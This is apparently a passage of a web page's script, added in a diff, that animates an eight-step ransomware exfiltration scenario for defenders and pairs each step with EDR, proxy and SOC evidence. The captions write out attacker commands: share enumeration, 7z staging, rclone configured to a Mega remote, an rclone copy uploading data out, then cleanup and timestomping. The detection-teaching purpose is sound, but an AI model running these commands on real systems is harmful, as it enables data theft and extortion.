+        var EDGES = [
+          { id:'atk-fs',   a:'atk',   b:'fs',    kind:'cmd',   bow:0.22 },
+          { id:'fs-cloud', a:'fs',    b:'cloud', kind:'data',  bow:0.18 },
+          { id:'fs-soc',   a:'fs',    b:'soc',   kind:'telem', bow:0.14 },
+          { id:'cloud-soc',a:'cloud', b:'soc',   kind:'telem', bow:-0.16 },
+          { id:'cloud-atk',a:'cloud', b:'atk',   kind:'data',  bow:0.30 }
+        ];
+        var STEPS = [
+          { chip:'1 · Quiet', title:'Quiet before the storm',
+            caption:'Step 1 of 8 \u2014 Quiet before the storm. FS01 was compromised days earlier through a stolen vendor VPN account; a scheduled-task implant is active but idle.',
+            hint:'Almost nothing right now \u2014 the only clue is one odd VPN login from a new country weeks ago, closed as a false positive.',
+            soc:'Baseline clean. Retro-note: one VPN login from a new ASN weeks ago was reviewed and closed as benign.',
+            action:{ node:'fs', pos:'top', text:'implant idle \u2014 gentle beacon only' },
+            flows:[{edge:'atk-fs', color:'accent', n:1}],
+            active:['atk','fs'], ev:[],
+            now:{ fs:'Implant running quietly since the VPN compromise. No new tools, no new files yet.' } },
+          { chip:'2 · Recon', title:'Shopping for data',
+            caption:'Step 2 of 8 \u2014 Shopping for data. From the implant, the attacker sweeps the shares: dir /s walks finance, HR and R&D to build a target list.',
+            hint:'The EDR records ~1,400 directory listings in twelve minutes \u2014 starting 03:00 local, on a server that normally only serves files.',
+            soc:'EDR: burst of dir sweeps on FS01 at 03:00. Review queued \u2014 off-hours share enumeration is unusual.',
+            action:{ node:'fs', pos:'top', text:'dir /s \\\\FS01\\finance \u00b7 \\HR \u00b7 \\R&D' },
+            flows:[{edge:'fs-soc', color:'violet', n:2}],
+            active:['atk','fs','soc'], ev:['dir sweeps'],
+            now:{ fs:'A cmd.exe child is walking every share. 1,400 listings in 12 minutes.',
+                  soc:'Dir-sweep burst captured; the name of every listed file lands in EDR telemetry.' } },
+          { chip:'3 · Stage', title:'Packing with a password',
+            caption:'Step 3 of 8 \u2014 Packing with a password. The attacker compresses the chosen shares into one password-protected archive \u2014 one file is far easier to upload than ten thousand.',
+            hint:'7z.exe runs on a server for the first time ever, and a temp file starts growing toward gigabytes.',
+            soc:'EDR: 7z.exe first-seen on FS01; arc.7z growing in C:\\Windows\\Temp.',
+            action:{ node:'fs', pos:'top', text:'7z a -p<pass> C:\\Windows\\Temp\\arc.7z \\\\FS01\\finance' },
+            flows:[{edge:'fs-soc', color:'violet', n:2}],
+            active:['atk','fs','soc'], ev:['7z temp file'],
+            now:{ fs:'7z.exe writes arc.7z into Temp \u2014 size climbs fast.',
+                  soc:'First-seen 7z on a server + a multi-GB temp file: staging signature.' } },
+          { chip:'4 · Arm', title:'The remote config appears',
+            caption:'Step 4 of 8 \u2014 The remote config appears. rclone is staged and configured: rclone config writes a remote named mega: \u2014 cloud credentials included \u2014 into %APPDATA%\\rclone\\rclone.conf.',
+            hint:'Sysmon Event ID 11: file create for rclone.conf \u2014 a filename that has never appeared anywhere in the estate \u2014 plus first-seen rclone.exe.',
+            soc:'Sysmon 11: rclone.conf created on FS01; rclone.exe has never run here before \u2192 high-value alert.',
+            action:{ node:'fs', pos:'top', text:'rclone config \u2192 rclone.conf (remote: mega:)' },
+            flows:[{edge:'fs-soc', color:'violet', n:2}],
+            active:['atk','fs','soc'], ev:['rclone.conf create'],
+            now:{ fs:'rclone.exe (first-seen) writes rclone.conf with the attacker\u2019s credentials.',
+                  soc:'rclone.conf file-create alert fires \u2014 the channel is armed.' } },
+          { chip:'5 · Upload', title:'The upload',
+            caption:'Step 5 of 8 \u2014 The upload. The main event: rclone copy C:\\Windows\\Temp mega:corp-backup pushes tens of gigabytes out over parallel TLS connections, shaped with --bwlimit to stay polite.',
+            hint:'Proxy bytes-up for FS01 explodes to \u224850\u00d7 the 30-day baseline and the CASB flags an unmanaged cloud-storage app (mega.nz). This alert is the warning window.',
+            soc:'Proxy: FS01 upload \u224850\u00d7 baseline \u2192 alert. CASB: unmanaged app mega.nz. Incident opened.',
+            action:{ node:'fs', pos:'bottom', text:'rclone copy C:\\Windows\\Temp mega:corp-backup --transfers 8' },
+            flows:[{edge:'fs-cloud', color:'accent2', n:4},{edge:'fs-soc', color:'violet', n:1}],
+            active:['atk','fs','cloud','soc'], ev:['proxy baseline break'],
+            now:{ fs:'rclone streams the archive out \u2014 hours of steady encrypted uploads.',
+                  cloud:'Mega accepts the objects; nothing about the account marks it as attacker-owned.',
+                  soc:'Volume baseline break + unmanaged-app event: the strongest on-prem evidence.' } },
+          { chip:'6 · Clean', title:'Cleaning up',
+            caption:'Step 6 of 8 \u2014 Cleaning up. The attacker deletes arc.7z, wipes the staging folder and touches file timestamps to confuse later review.',
+            hint:'USN journal delete records for the archive, and the EDR flags a $STANDARD_INFORMATION vs $FILE_NAME timestamp mismatch \u2014 a classic timestomping hint.',
+            soc:'USN deletes of arc.7z + timestomping hint on FS01 \u2014 anti-forensics in progress.',
+            action:{ node:'fs', pos:'top', text:'del arc.7z \u00b7 clear staging \u00b7 touch timestamps' },
+            flows:[{edge:'fs-soc', color:'violet', n:2}],
+            active:['atk','fs','soc'], ev:['USN delete'],
+            now:{ fs:'Archive deleted from Temp; a few timestamps no longer match their $FILE_NAME values.',
+                  soc:'USN delete + timestamp-mismatch flag: tidy-up signature after a transfer.' } },
+          { chip:'7 · Retrieve', title:'Attacker downloads',
+            caption:'Step 7 of 8 \u2014 Attacker downloads. On their own infrastructure, the attacker pulls the archive from Mega to keep a local copy.',
+            hint:'Nothing on the corporate side \u2014 the download happens entirely inside the cloud provider, between the attacker\u2019s account and their devices.',
+            soc:'No corporate-side telemetry \u2014 retrieval is invisible from inside your network.',
+            action:{ node:'cloud', pos:'bottom', text:'Mega \u2192 attacker VPS (own account)' },
+            flows:[{edge:'cloud-atk', color:'accent2', n:2}],
+            active:['atk','cloud'], ev:[],
+            now:{ cloud:'Provider-side retrieval between attacker accounts \u2014 outside your visibility.',
+                  atk:'The operator now holds a full copy; extortion leverage is ready.' } },
+          { chip:'8 · Impact', title:'Encryption follows',
+            caption:'Step 8 of 8 \u2014 Encryption follows. With the data safely copied, the attacker runs the ransomware: shares get encrypted, a note appears, and the extortion email quotes samples of the stolen files.',
+            hint:'The SOC replay now shows the whole chain \u2014 and the rclone alert fired roughly six hours before the first encryption event. That gap was the warning window.',
+            soc:'Encryption events (late). Replay: rclone alert \u2192 ~6 h lead \u2192 encryption. Post-incident review scheduled.',
+            action:{ node:'fs', pos:'bottom', text:'ransomware runs \u2014 shares encrypted' },
+            flows:[{edge:'fs-soc', color:'danger', n:3}],
+            active:['atk','fs','soc'], ev:['encryption events (late)','rclone alert timeline'],
+            now:{ fs:'Encryption overwrites the shares; ransom notes appear in every folder.',
+                  soc:'Full-chain replay: the rclone alert was a ~6-hour early warning \u2014 never miss it again.' } }
+        ];
+
+        var canvas = $('simCanvas'), ctx = canvas ? canvas.getContext('2d') : null;
+        var simTooltip = $('simTooltip');
+        var capEl = $('simCaption'), hintEl = $('simHint'), socEl = $('simSoc'), evEl = $('simEvidence');
+        var chipsEl = $('simChips');
+        var playBtn = $('simPlay'), pauseBtn = $('simPause'), restartBtn = $('simRestart');
+        var prevBtn = $('simPrev'), nextBtn = $('simNext'), speedSel = $('simSpeed');
+
+        var stepIndex = 0, playing = false, speed = 1, stepStart = 0, raf = null;
+        var W = 0, H = 0, geom = {};
+        var STEP_MS = 4200;
+        var COLORS = {};
+        var pinnedNode = null, hoverNode = null, mousePos = null;
+
+        function readColors(){
+          var cs = getComputedStyle(document.documentElement);
+          var names = ['bg','surface','surface-2','elevated','text','muted','border','border-strong','accent','accent-2','violet','success','warning','danger'];
+          var out = {};
+          names.forEach(function(n){ out[n.replace(/-/g,'')] = cs.getPropertyValue('--' + n).trim(); });
+          COLORS = out;
+        }
+        function flowColor(key){
+          return {accent:COLORS.accent, accent2:COLORS.accent2, violet:COLORS.violet, danger:COLORS.danger}[key] || COLORS.accent;
+        }
+        function roundRect(x,y,w,h,r){
+          ctx.beginPath();
+          ctx.moveTo(x+r,y);
+          ctx.arcTo(x+w,y,x+w,y+h,r);
+          ctx.arcTo(x+w,y+h,x,y+h,r);
+          ctx.arcTo(x,y+h,x,y,r);
+          ctx.arcTo(x,y,x+w,y,r);
+          ctx.closePath();
+        }
+        function computeGeom(){
+          geom = {};
+          NODES.forEach(function(nd){
+            var nw = Math.min(W*0.235, 250), nh = Math.max(56, Math.min(H*0.21, 88));
+            geom[nd.id] = { cx:nd.fx*W, cy:nd.fy*H, w:nw, h:nh, node:nd };
+          });
+        }
+        function anchorPoint(g, tx, ty){
+          var dx = tx - g.cx, dy = ty - g.cy;
+          var sx = dx !== 0 ? (g.w/2) / Math.abs(dx) : Infinity;
+          var sy = dy !== 0 ? (g.h/2) / Math.abs(dy) : Infinity;
+          var s = Math.min(sx, sy);
+          return { x:g.cx + dx*s, y:g.cy + dy*s };
+        }
+        function edgeGeom(e){
+          var ga = geom[e.a], gb = geom[e.b];
+          var p1 = anchorPoint(ga, gb.cx, gb.cy);
+          var p2 = anchorPoint(gb, ga.cx, ga.cy);
+          var mx = (p1.x+p2.x)/2, my = (p1.y+p2.y)/2;
+          var dx = p2.x-p1.x, dy = p2.y-p1.y;
+          var len = Math.sqrt(dx*dx+dy*dy) || 1;
+          var off = e.bow * len;
+          var cx = mx + (-dy/len)*off, cy = my + (dx/len)*off;
+          return { p1:p1, p2:p2, cx:cx, cy:cy };
+        }
+        function bezPoint(g, t){
+          var u = 1-t;
+          return {
+            x: u*u*g.p1.x + 2*u*t*g.cx + t*t*g.p2.x,
+            y: u*u*g.p1.y + 2*u*t*g.cy + t*t*g.p2.y
+          };
+        }
+        function drawEdge(e, state, color){
+          var g = edgeGeom(e);
+          var active = state === 'active';
+          ctx.save();
+          ctx.lineWidth = active ? 2.4 : 1.2;
+          ctx.strokeStyle = active ? color : COLORS.borderstrong;
+          if (e.kind === 'cmd' || e.kind === 'telem') ctx.setLineDash([5,5]);
+          ctx.beginPath();
+          ctx.moveTo(g.p1.x, g.p1.y);
+          ctx.quadraticCurveTo(g.cx, g.cy, g.p2.x, g.p2.y);
+          ctx.stroke();
+          ctx.setLineDash([]);
+          var p2 = bezPoint(g, 0.98), p1 = bezPoint(g, 0.90);
+          var ang = Math.atan2(p2.y-p1.y, p2.x-p1.x);
+          ctx.translate(p2.x, p2.y); ctx.rotate(ang);
+          ctx.fillStyle = active ? color : COLORS.borderstrong;
+          ctx.beginPath();
+          ctx.moveTo(0,0); ctx.lineTo(-9,-4.5); ctx.lineTo(-9,4.5);
+          ctx.closePath(); ctx.fill();
+          ctx.restore();
+        }
+        function drawPackets(e, color, n, now){
+          var g = edgeGeom(e);
+          for (var i = 0; i < n; i++){
+            var t;
+            if (playing && !reduceMotion){
+              var span = STEP_MS / speed / 1000;
+              t = ((now / 1000) / span + i / n) % 1;
+            } else {
+              t = (i + 0.5) / n;
+            }
+            var p = bezPoint(g, t);
+            ctx.beginPath();
+            ctx.arc(p.x, p.y, 4.2, 0, Math.PI*2);
+            ctx.fillStyle = color;
+            ctx.fill();
+            ctx.strokeStyle = COLORS.bg;
+            ctx.lineWidth = 1.2;
+            ctx.stroke();
+          }
+        }
+        function wrap2(text){
+          if (text.length <= 46) return [text];
+          var cut = text.lastIndexOf(' ', 46);
+          if (cut < 20) cut = 46;
+          return [text.slice(0, cut), text.slice(cut+1)];
+        }
+        function drawActionBubble(st){
+          if (!st.action) return;
+          var g = geom[st.action.node];
+          if (!g) return;
+          var lines = wrap2(st.action.text);
+          ctx.font = '11px ui-monospace, SFMono-Regular, Menlo, Consolas, monospace';
+          var wMax = 0;
+          lines.forEach(function(l){ wMax = Math.max(wMax, ctx.measureText(l).width); });
+          var bw = Math.min(wMax + 22, W*0.86), bh = 20 + (lines.length-1)*15;
+          var bx = Math.max(8, Math.min(g.cx - bw/2, W - bw - 8));
+          var by = st.action.pos === 'top' ? g.cy - g.h/2 - bh - 12 : g.cy + g.h/2 + 12;
+          ctx.fillStyle = COLORS.elevated;
+          ctx.strokeStyle = COLORS.accent;
+          ctx.lineWidth = 1.2;
+          roundRect(bx, by, bw, bh, 8);
+          ctx.fill(); ctx.stroke();
+          ctx.fillStyle = COLORS.text;
+          ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+          lines.forEach(function(l, i){
+            ctx.fillText(l, bx + bw/2, by + 11 + i*15);
+          });
+          ctx.textAlign = 'left';
+        }
+        function drawStepBadge(st, idx){
+          ctx.font = '700 12px ui-monospace, SFMono-Regular, Menlo, Consolas, monospace';
+          var label = 'Step ' + (idx+1) + '/8 \u00b7 ' + st.title;
+          ctx.fillStyle = COLORS.muted;
+          ctx.textBaseline = 'alphabetic';
+          ctx.fillText(label, 12, 22);
+          ctx.strokeStyle = COLORS.border;
+          ctx.beginPath(); ctx.moveTo(12, 29); ctx.lineTo(12 + ctx.measureText(label).width, 29); ctx.stroke();
+        }
+        function drawEvidenceDiamonds(currentStepNum){
+          var counts = { fs:0, soc:0, cloud:0, atk:0 };
+          var evSteps = { 'dir sweeps':2, '7z temp file':3, 'rclone.conf create':4, 'proxy baseline break':5, 'USN delete':6, 'encryption events (late)':8, 'rclone alert timeline':8 };
+          Object.keys(evSteps).forEach(function(k){
+            if (evSteps[k] <= currentStepNum){
+              if (k === 'proxy baseline break' || k.indexOf('encryption') === 0 || k.indexOf('rclone alert') === 0) counts.soc++;
+              else if (k === 'rclone.conf create' || k === '7z temp file' || k === 'dir sweeps' || k === 'USN delete') counts.fs++;
+            }
+          });
+          Object.keys(counts).forEach(function(id){
+            var g = geom[id];
+            if (!g || !counts[id]) return;
+            for (var i = 0; i < counts[id] && i < 4; i++){
+              var x = g.cx - g.w/2 + 10 + i*16, y = g.cy - g.h/2 - 8;
+              ctx.save();
+              ctx.translate(x, y); ctx.rotate(Math.PI/4);
+              ctx.fillStyle = COLORS.warning;
+              ctx.strokeStyle = COLORS.bg;
+              ctx.fillRect(-4, -4, 8, 8);
+              ctx.strokeRect(-4, -4, 8, 8);
+              ctx.restore();
+            }
+          });
+        }
+        function draw(){
+          if (!ctx) return;
+          var st = STEPS[stepIndex];
+          var num = stepIndex + 1;
+          ctx.clearRect(0, 0, W, H);
+          var now = (performance && performance.now) ? performance.now() : Date.now();
+          ctx.fillStyle = COLORS.surface2;
+          roundRect(0.5, 0.5, W-1, H-1, 12);
+          ctx.fill();
+          var flowEdges = {};
+          st.flows.forEach(function(f){ flowEdges[f.edge] = f; });
+          EDGES.forEach(function(e){
+            var f = flowEdges[e.id];
+            if (f){
+              var col = flowColor(f.color);
+              drawEdge(e, 'active', col);
+              drawPackets(e, col, f.n, now);
+            } else {
+              drawEdge(e, 'idle');
+            }
+          });
+          NODES.forEach(function(nd){
+            var g = geom[nd.id];
+            var isActive = st.active.indexOf(nd.id) !== -1;
+            ctx.save();
+            ctx.fillStyle = isActive ? COLORS.elevated : COLORS.surface;
+            ctx.strokeStyle = isActive ? COLORS.accent : COLORS.borderstrong;
+            ctx.lineWidth = isActive ? 2 : 1.2;
+            roundRect(g.cx - g.w/2, g.cy - g.h/2, g.w, g.h, 10);
+            ctx.fill(); ctx.stroke();
+            ctx.fillStyle = isActive ? COLORS.text : COLORS.muted;
+            ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+            ctx.font = '700 12.5px system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif';
+            var words = nd.name.split(' ');
+            var line1 = nd.name, line2 = '';
+            if (nd.name.length > 20 && ctx.measureText(nd.name).width > g.w - 16){
+              var cutAt = nd.name.lastIndexOf(' ', 20);
+              if (cutAt > 4){ line1 = nd.name.slice(0, cutAt); line2 = nd.name.slice(cutAt+1); }
+            }
+            if (line2){
+              ctx.fillText(line1, g.cx, g.cy - 9);
+              ctx.fillText(line2, g.cx, g.cy + 6);
+            } else {
+              ctx.fillText(line1, g.cx, g.cy - 2);
+            }
+            ctx.textAlign = 'left';
+            ctx.restore();
+          });
+          drawActionBubble(st);
+          drawEvidenceDiamonds(num);
+          drawStepBadge(st, stepIndex);
+        }
+        function loop(now){
+          if (!playing) return;
+          var dur = STEP_MS / speed;
+          if (now - stepStart >= dur){
+            if (stepIndex < STEPS.length - 1){
+              stepIndex++;
+              stepStart = now;
+              updateDOM();
+              draw();
+            } else {
+              stopPlay();
+              updateDOM();
+              draw();
+              return;
+          }
+          }
+          draw();
+          raf = requestAnimationFrame(loop);
+        }
+        function startPlay(){
+          if (playing) return;
+          if (reduceMotion){
+            if (stepIndex < STEPS.length - 1){ stepIndex++; updateDOM(); draw(); }
+            return;
+          }
+          playing = true;
+          stepStart = (performance && performance.now) ? performance.now() : Date.now();
+          if (playBtn) playBtn.setAttribute('aria-pressed', 'true');
+          if (pauseBtn) pauseBtn.disabled = false;
+          raf = requestAnimationFrame(loop);
+        }
+        function stopPlay(){
+          playing = false;
+          if (raf){ cancelAnimationFrame(raf); raf = null; }
+          if (playBtn) playBtn.setAttribute('aria-pressed', 'false');
+          if (pauseBtn) pauseBtn.disabled = true;
+        }
+        function gotoStep(i){
+          stopPlay();
+          stepIndex = Math.max(0, Math.min(STEPS.length - 1, i));
+          updateDOM();
+          draw();
+        }
+        function updateDOM(){
+          var st = STEPS[stepIndex];
+          var num = stepIndex + 1;
+          if (capEl) capEl.textContent = st.caption;
+          if (hintEl) hintEl.innerHTML = '<b>What the defender sees:</b> ' + st.hint;
+          if (socEl) socEl.innerHTML = '<b>SOC view:</b> ' + st.soc;
+          if (evEl){
+            var chips = evEl.querySelectorAll('.ev-chip');
+            Array.prototype.forEach.call(chips, function(ch){
+              ch.classList.toggle('lit', parseInt(ch.getAttribute('data-step'), 10) <= num);
+            });
+          }
+          if (chipsEl){
+            var chipBtns = chipsEl.querySelectorAll('.sim-chip');
+            Array.prototype.forEach.call(chipBtns, function(b, i){
+              var on = i === stepIndex;
+              b.classList.toggle('active', on);
+              b.setAttribute('aria-current', on ? 'step' : 'false');
+            });
+          }
+          if (playBtn) playBtn.disabled = playing;
+          if (pauseBtn) pauseBtn.disabled = !playing;
+          if (prevBtn) prevBtn.disabled = stepIndex === 0;
+          if (nextBtn) nextBtn.disabled = stepIndex === STEPS.length - 1;
+          if (simTooltip && pinnedNode) showTooltipFor(pinnedNode, true);
+        }
+        function buildChips(){
+          if (!chipsEl) return;
+          chipsEl.innerHTML = '';
+          STEPS.forEach(function(st, i){
+            var b = document.createElement('button');
+            b.type = 'button';
+            b.className = 'sim-chip' + (i === stepIndex ? ' active' : '');
+            b.textContent = st.chip;
+            b.setAttribute('aria-label', 'Go to step ' + (i+1) + ': ' + st.title);
+            b.addEventListener('click', function(){ gotoStep(i); });
+            chipsEl.appendChild(b);
+          });
+        }
+        function refreshSim(){
+          readColors();
+          draw();
+        }
+        function resize(){
+          if (!canvas || !ctx) return;
+          var w = canvas.clientWidth || (canvas.parentElement ? canvas.parentElement.clientWidth : 800);
+          if (!w) w = 800;
+          var h = Math.max(300, Math.min(440, Math.round(w * 0.52)));
+          canvas.style.height = h + 'px';
+          var dpr = window.devicePixelRatio || 1;
+          canvas.width = Math.round(w * dpr);
+          canvas.height = Math.round(h * dpr);
+          ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+          W = w; H = h;
+          computeGeom();
+          draw();
+        }
+        function nodeAt(x, y){
+          for (var i = 0; i < NODES.length; i++){
+            var g = geom[NODES[i].id];
+            if (x >= g.cx - g.w/2 && x <= g.cx + g.w/2 && y >= g.cy - g.h/2 && y <= g.cy + g.h/2) return NODES[i];
+          }
+          return null;
+        }
+        function showTooltipFor(node, pin){
+          if (!simTooltip || !node) return;
+          var st = STEPS[stepIndex];
+          var nowLine = st.now && st.now[node.id] ? '<i style="display:block;margin-top:5px;color:var(--muted);">Now: ' + st.now[node.id] + '</i>' : '';
+          simTooltip.innerHTML = '<b>' + node.name + '</b>' + node.desc + nowLine;
+          simTooltip.style.display = 'block';
+          if (mousePos){
+            var px = Math.min(mousePos.x + 14, window.innerWidth - 300);
+            var py = Math.min(mousePos.y + 16, window.innerHeight - 160);
+            simTooltip.style.left = Math.max(8, px) + 'px';
+            simTooltip.style.top = Math.max(8, py) + 'px';
+          }
+          if (pin) pinnedNode = node;
+        }
+        function hideTooltip(force){
+          if (force) pinnedNode = null;
+          if (pinnedNode) return;
+          if (simTooltip) simTooltip.style.display = 'none';
+        }
+        if (canvas){
+          canvas.addEventListener('mousemove', function(e){
+            var r = canvas.getBoundingClientRect();
+            var x = e.clientX - r.left, y = e.clientY - r.top;
+            mousePos = { x:e.clientX, y:e.clientY };
+            var nd = nodeAt(x, y);
+            hoverNode = nd;
+            canvas.style.cursor = nd ? 'pointer' : 'crosshair';
+            if (nd) showTooltipFor(nd, false);
+            else hideTooltip(false);
+          });
+          canvas.addEventListener('click', function(e){
+            var r = canvas.getBoundingClientRect();
+            var nd = nodeAt(e.clientX - r.left, e.clientY - r.top);
+            if (nd){
+              if (pinnedNode === nd){ pinnedNode = null; hideTooltip(false); }
+              else showTooltipFor(nd, true);
+            } else {
+              pinnedNode = null;
+              hideTooltip(false);
+            }
+          });
+          canvas.addEventListener('mouseleave', function(){
+            hoverNode = null;
+            hideTooltip(false);
+          });
+        }
+        if (playBtn) playBtn.addEventListener('click', startPlay);
+        if (pauseBtn) pauseBtn.addEventListener('click', stopPlay);
+        if (restartBtn) restartBtn.addEventListener('click', function(){ gotoStep(0); });
+        if (prevBtn) prevBtn.addEventListener('click', function(){ gotoStep(stepIndex - 1); });
+        if (nextBtn) nextBtn.addEventListener('click', function(){ gotoStep(stepIndex + 1); });
+        if (speedSel) speedSel.addEventListener('change', function(){
+          speed = parseFloat(speedSel.value) || 1;
+        });
+        window.addEventListener('resize', resize);
+        buildChips();
+        readColors();
+        resize();
+        updateDOM();
+        if (reduceMotion && playBtn){
+          playBtn.title = 'Reduced motion: Play advances one step at a time (no animated packets).';
+        }
+      })();
+      </script>
+</body>
+</html>
